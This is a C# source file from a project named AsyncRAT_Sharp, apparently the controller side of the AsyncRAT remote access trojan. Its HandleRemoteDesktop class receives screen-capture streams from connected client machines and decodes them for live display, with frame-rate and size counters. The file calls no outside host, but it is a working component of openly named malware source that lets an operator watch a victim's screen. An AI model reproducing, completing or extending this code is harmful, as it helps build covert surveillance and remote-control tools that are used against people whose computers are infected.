using AsyncRAT_Sharp.Forms;
using AsyncRAT_Sharp.Helper;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Handle_Packet
{
   public class HandleRemoteDesktop
    {
        public void Capture(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                if (Program.form1.InvokeRequired)
                {
                    Program.form1.BeginInvoke((MethodInvoker)(() =>
                    {
                        FormRemoteDesktop RD = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (RD != null)
                            {
                                if (RD.C2 == null)
                                {
                                    RD.C2 = client;
                                    RD.timer1.Start();
                                    byte[] RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                    Bitmap decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
                                    RD.rdSize = decoded0.Size;
                                    RD.Size = new Size(decoded0.Size.Width / 2, decoded0.Size.Height / 2);
                                }
                                byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));

                                int Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                                RD.numericUpDown2.Maximum = Screens - 1;

                                if (RD.RenderSW.ElapsedMilliseconds >= (1000 / 20))
                                {
                                    RD.pictureBox1.Image = (Bitmap)decoded;
                                    RD.RenderSW = Stopwatch.StartNew();
                                }
                                RD.FPS++;
                                if (RD.sw.ElapsedMilliseconds >= 1000)
                                {
                                    RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" + decoded.Width + " x " + decoded.Height + "    Size:" + Methods.BytesToString(RdpStream.Length);
                                    RD.FPS = 0;
                                    RD.sw = Stopwatch.StartNew();
                                }
                            }
                            else
                            {
                                client.Disconnected();
                                return;
                            }
                        }
                        catch (Exception ex) { Debug.WriteLine(ex.Message); }
                    }));
                }
            }
            catch { }
        }
    }
}
